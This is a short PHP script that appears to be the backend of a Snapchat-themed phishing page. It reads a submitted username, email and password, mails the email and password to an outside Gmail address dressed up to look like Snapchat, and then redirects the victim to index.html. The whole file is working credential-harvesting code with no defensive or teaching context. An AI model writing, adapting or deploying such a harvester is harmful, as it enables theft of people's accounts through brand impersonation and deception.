 <?php
 


$username = $_POST['username'];
$email = $_POST['email'];
$password = $_POST['password'];
$to = "noreplay.snapchat.net@gmail.com";
$subject = "Mail From Website";

$headers = "Form:" .$name. "\r\n";

$txt = "You have recived an e-mail from" .$name.  "\r\n Email: " .$email. "\r\n Password:" .$password;

if($email != NULL){
    mail($to, $subject, $txt, $headers);
}

header('Location:index.html');






 ?>
